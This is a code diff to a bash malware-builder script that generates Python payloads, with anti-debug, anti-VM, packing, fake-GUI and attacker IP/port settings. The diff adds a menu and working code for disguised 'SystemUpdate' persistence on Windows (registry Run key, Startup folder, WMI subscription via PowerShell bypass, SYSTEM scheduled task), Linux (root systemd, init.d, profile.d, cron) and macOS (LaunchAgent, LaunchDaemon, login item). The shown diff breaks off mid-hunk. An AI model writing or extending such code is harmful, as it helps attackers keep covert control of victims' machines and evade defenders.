@@ -41,6 +41,9 @@ declare -A PERSISTENCE_METHODS=(
     ["4"]="systemd"
     ["5"]="startup_folder"
     ["6"]="wmi_subscription"
+    ["7"]="windows_startup"  # New: Windows Startup folder
+    ["8"]="macos_launchagent"  # New: macOS LaunchAgent
+    ["9"]="linux_systemd"  # New: Linux systemd
 )
 declare -A OBFUSCATION_TECHNIQUES=(
     ["1"]="basic"
@@ -66,7 +69,7 @@ declare -A DELIVERY_METHODS=(
 )
 
 # Global variables
-SCRIPT_VERSION="7.9-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec-FakeGUI-FixedIndent"
+SCRIPT_VERSION="7.9-Cloudflare-HTTPS-Fixed-CrossPlatform-AutoExec-FakeGUI-FixedIndent-Enhanced"
 BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
 
@@ -78,7 +81,7 @@ FINAL_NAME=""
 PAYLOAD_TYPE=""
 ENCRYPTION_ALGORITHM="AES-256-GCM"
 OBFUSCATION_LEVEL=3
-PERSISTENCE_METHOD="registry"
+PERSISTENCE_METHOD="windows_startup"  # Changed default to Windows startup folder
 ANTI_DEBUG_ENABLED=true
 ANTI_VM_ENABLED=true
 PACKER_ENABLED=true
@@ -571,6 +574,56 @@ get_configuration() {
     if [ "$AUTO_EXECUTION" = true ]; then
         echo -e "${Y}[*] Auto-execution will be enabled for this payload.${NC}"
         log_message "INFO" "Auto-execution enabled"
+        
+        # Enhanced persistence method selection based on OS
+        echo -e "\n${B}SELECT PERSISTENCE METHOD:${NC}"
+        if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+            echo "1) Windows Registry (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)"
+            echo "2) Windows Startup Folder (C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp)"
+            echo "3) WMI Event Subscription"
+            echo "4) Scheduled Task"
+        elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+            echo "5) Cron Job"
+            echo "6) Systemd Service (/lib/systemd/system/)"
+            echo "7) Init.d Script"
+            echo "8) Profile Modification"
+        elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+            echo "9) LaunchAgent (/Library/LaunchAgents/)"
+            echo "10) LaunchDaemon (/Library/LaunchDaemons/)"
+            echo "11) Login Item"
+            echo "12) Cron Job"
+        fi
+        
+        while true; do
+            read -p ">> " pers_choice
+            if [ "$TARGET_OS" == "Windows" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+                case $pers_choice in
+                    1) PERSISTENCE_METHOD="registry"; break ;;
+                    2) PERSISTENCE_METHOD="windows_startup"; break ;;
+                    3) PERSISTENCE_METHOD="wmi_subscription"; break ;;
+                    4) PERSISTENCE_METHOD="scheduled_task"; break ;;
+                    *) echo -e "${R}[!] Invalid choice. Please enter 1-4.${NC}" ;;
+                esac
+            elif [ "$TARGET_OS" == "Linux" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+                case $pers_choice in
+                    5) PERSISTENCE_METHOD="cron"; break ;;
+                    6) PERSISTENCE_METHOD="linux_systemd"; break ;;
+                    7) PERSISTENCE_METHOD="init_script"; break ;;
+                    8) PERSISTENCE_METHOD="profile_mod"; break ;;
+                    *) echo -e "${R}[!] Invalid choice. Please enter 5-8.${NC}" ;;
+                esac
+            elif [ "$TARGET_OS" == "macOS" ] || [ "$TARGET_OS" == "Cross-platform" ]; then
+                case $pers_choice in
+                    9) PERSISTENCE_METHOD="macos_launchagent"; break ;;
+                    10) PERSISTENCE_METHOD="macos_launchdaemon"; break ;;
+                    11) PERSISTENCE_METHOD="login_item"; break ;;
+                    12) PERSISTENCE_METHOD="cron"; break ;;
+                    *) echo -e "${R}[!] Invalid choice. Please enter 9-12.${NC}" ;;
+                esac
+            fi
+        done
+        
+        log_message "INFO" "Persistence method selected: $PERSISTENCE_METHOD"
     else
         echo -e "${Y}[*] Auto-execution will be disabled for this payload.${NC}"
         log_message "INFO" "Auto-execution disabled"
@@ -679,13 +732,6 @@ advanced_config() {
     done
     read -p ">> " obs_choice
     OBFUSCATION_LEVEL=$obs_choice
-    
-    echo -e "\n${Y}Select persistence method:${NC}"
-    for i in "${!PERSISTENCE_METHODS[@]}"; do
-        echo "$i) ${PERSISTENCE_METHODS[$i]}"
-    done
-    read -p ">> " pers_choice
-    PERSISTENCE_METHOD="${PERSISTENCE_METHODS[$pers_choice]:-${PERSISTENCE_METHODS[1]}}"
     
     echo -e "\n${Y}Select packing method:${NC}"
     for i in "${!PACKING_METHODS[@]}"; do
@@ -1177,6 +1223,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1190,40 +1237,74 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            import os
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
                 
-            # Create scheduled task
-            task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon'
-            subprocess.run(task_cmd, shell=True, check=False)
-            
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
+                
         elif system == "Linux":
-            # Linux cron job persistence
-            import os
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-            # Create systemd service
-            service_content = f"""[Unit]
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
 Description=System Update Service
 After=network.target
 
@@ -1232,50 +1313,158 @@ Type=simple
 ExecStart={exe_path}
 Restart=on-failure
 RestartSec=10
-User={os.getenv('USER')}
+User=root
 
 [Install]
 WantedBy=multi-user.target
 """
-            
-            service_path = f"/home/{os.getenv('USER')}/.config/systemd/user/system-update.service"
-            os.makedirs(os.path.dirname(service_path), exist_ok=True)
-            with open(service_path, "w") as f:
-                f.write(service_content)
                 
-            subprocess.run(f"systemctl --user enable system-update.service", shell=True, check=False)
-            
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
         elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            import os
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1325,6 +1514,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 ATTACKER_IP = "$attacker_ip"
 ATTACKER_PORT = "$attacker_port"
 
@@ -1340,60 +1530,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && touch "\$PIDFILE"
+    return \$RETVAL
+}}
+
+stop() {{
+    echo -n "Stopping SystemUpdate: "
+    killproc -p "\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
+    [ \$RETVAL -eq 0 ] && rm -f "\$PIDFILE"
+    return \$RETVAL
+}}
+
+case "\$1" in
+    start)
+        start
+        ;;
+    stop)
+        stop
+        ;;
+    restart)
+        stop
+        start
+        ;;
+    status)
+        status -p "\$PIDFILE" "\$DAEMON"
+        ;;
+    *)
+        echo "Usage: {{start|stop|restart|status}}"
+        exit 1
+esac
+
+exit \$RETVAL
+"""
+                
+                init_path = "/etc/init.d/system-update"
+                with open(init_path, "w") as f:
+                    f.write(init_script)
+                    
+                os.chmod(init_path, 0o755)
+                subprocess.run("chkconfig --add system-update", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "profile_mod":
+                # Add to profile
+                profile_path = "/etc/profile.d/system-update.sh"
+                with open(profile_path, "w") as f:
+                    f.write(f"#!/bin/bash\n{exe_path} &\n")
+                os.chmod(profile_path, 0o755)
+                
+        elif system == "Darwin":  # macOS
+            # Get current executable path
+            exe_path = os.path.abspath(sys.argv[0])
+            
+            # macOS persistence based on selected method
+            if PERSISTENCE_METHOD == "macos_launchagent":
+                # Create LaunchAgent
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchAgents/com.system.update.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "macos_launchdaemon":
+                # Create LaunchDaemon
+                plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.system.update.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe_path}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>'''
+                
+                plist_path = "/Library/LaunchDaemons/com.system.update.daemon.plist"
+                with open(plist_path, "w") as f:
+                    f.write(plist_content)
+                    
+                subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "login_item":
+                # Add to login items
+                script = f'''
+tell application "System Events"
+    make login item at end with properties {{path:"{exe_path}", hidden:false}}
+end tell
+'''
+                subprocess.run(["osascript", "-e", script], check=False)
+                
+            elif PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
+                
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
             
     except Exception as e:
         # Silently handle errors in educational context
@@ -1439,6 +1803,7 @@ import threading
 # Auto-execution setup
 AUTO_EXECUTION = $AUTO_EXECUTION
 FAKE_GUI = $FAKE_GUI_ENABLED
+PERSISTENCE_METHOD = "$PERSISTENCE_METHOD"
 
 # Include Fake GUI logic if enabled
  $(generate_fake_gui_code)
@@ -1452,60 +1817,234 @@ def setup_persistence():
         system = platform.system()
         
         if system == "Windows":
-            # Windows registry persistence
-            import winreg
-            
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to registry run key
-            key = winreg.HKEY_CURRENT_USER
-            subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-            with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+            # Windows persistence based on selected method
+            if PERSISTENCE_METHOD == "registry":
+                import winreg
+                # Add to registry run key
+                key = winreg.HKEY_CURRENT_USER
+                subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as registry_key:
+                    winreg.SetValueEx(registry_key, "SystemUpdate", 0, winreg.REG_SZ, exe_path)
+                    
+            elif PERSISTENCE_METHOD == "windows_startup":
+                # Copy to Windows Startup folder
+                startup_folder = os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
+                if not os.path.exists(startup_folder):
+                    os.makedirs(startup_folder)
+                startup_exe = os.path.join(startup_folder, "SystemUpdate.exe")
+                if not os.path.exists(startup_exe):
+                    import shutil
+                    shutil.copy2(exe_path, startup_exe)
+                    
+            elif PERSISTENCE_METHOD == "wmi_subscription":
+                # Create WMI event subscription
+                wmi_script = f'''
+\$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
+    EventNameSpace = "root\\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'"
+    Name = "SystemUpdateFilter"
+    EventName = "SystemUpdateFilter"
+}}
+
+\$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
+    Name = "SystemUpdateConsumer"
+    CommandLineTemplate = "{exe_path}"
+}}
+
+\$binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
+    Filter = \$filter
+    Consumer = \$consumer
+}}
+'''
+                # Execute PowerShell script
+                subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", wmi_script], check=False)
+                
+            elif PERSISTENCE_METHOD == "scheduled_task":
+                # Create scheduled task
+                task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "{exe_path}" /sc onlogon /ru System'
+                subprocess.run(task_cmd, shell=True, check=False)
                 
         elif system == "Linux":
-            # Linux cron job persistence
             # Get current executable path
             exe_path = os.path.abspath(sys.argv[0])
             
-            # Add to crontab
-            cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
-            with open("/tmp/crontab.txt", "w") as f:
-                f.write(cron_job)
-            
-            subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
-            os.remove("/tmp/crontab.txt")
-            
-        elif system == "Darwin":  # macOS
-            # macOS launchd persistence
-            # Get current executable path
-            exe_path = os.path.abspath(sys.argv[0])
-            
-            # FIX: Use single quotes
-            plist_content = '<?xml version="1.0" encoding="UTF-8"?>\\n'
-            plist_content += '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\\n'
-            plist_content += '<plist version="1.0">\\n'
-            plist_content += '<dict>\\n'
-            plist_content += '    <key>Label</key>\\n'
-            plist_content += '    <string>com.system.update</string>\\n'
-            plist_content += '    <key>ProgramArguments</key>\\n'
-            plist_content += '    <array>\\n'
-            plist_content += f'        <string>{exe_path}</string>\\n'
-            plist_content += '    </array>\\n'
-            plist_content += '    <key>RunAtLoad</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '    <key>KeepAlive</key>\\n'
-            plist_content += '    <true/>\\n'
-            plist_content += '</dict>\\n'
-            plist_content += '</plist>'
-            
-            plist_path = f"/Users/{os.getenv('USER')}/Library/LaunchAgents/com.system.update.plist"
-            os.makedirs(os.path.dirname(plist_path), exist_ok=True)
-            with open(plist_path, "w") as f:
-                f.write(plist_content)
+            # Linux persistence based on selected method
+            if PERSISTENCE_METHOD == "cron":
+                # Add to crontab
+                cron_job = f"@reboot {exe_path} > /dev/null 2>&1\\n"
+                with open("/tmp/crontab.txt", "w") as f:
+                    f.write(cron_job)
                 
-            subprocess.run(f"launchctl load {plist_path}", shell=True, check=False)
+                subprocess.run("crontab /tmp/crontab.txt", shell=True, check=False)
+                os.remove("/tmp/crontab.txt")
+                
+            elif PERSISTENCE_METHOD == "linux_systemd":
+                # Create systemd service
+                service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={exe_path}
+Restart=on-failure
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+"""
+                
+                service_path = "/lib/systemd/system/system-update.service"
+                with open(service_path, "w") as f:
+                    f.write(service_content)
+                    
+                subprocess.run("systemctl enable system-update.service", shell=True, check=False)
+                
+            elif PERSISTENCE_METHOD == "init_script":
+                # Create init.d script
+                init_script = f"""#!/bin/bash
+# System Update Service
+# chkconfig: 35 80 20
+# description: System Update Service
+
+. /etc/rc.d/init.d/functions
+
+USER=root
+DAEMON="{exe_path}"
+ROOT_DIR=$(dirname \$DAEMON)
+PIDFILE=/var/run/system-update.pid
+
+start() {{
+    echo -n "Starting SystemUpdate: "
+    daemon --user "\$USER" --pidfile="\$PIDFILE" "\$DAEMON"
+    RETVAL=\$?
+    echo
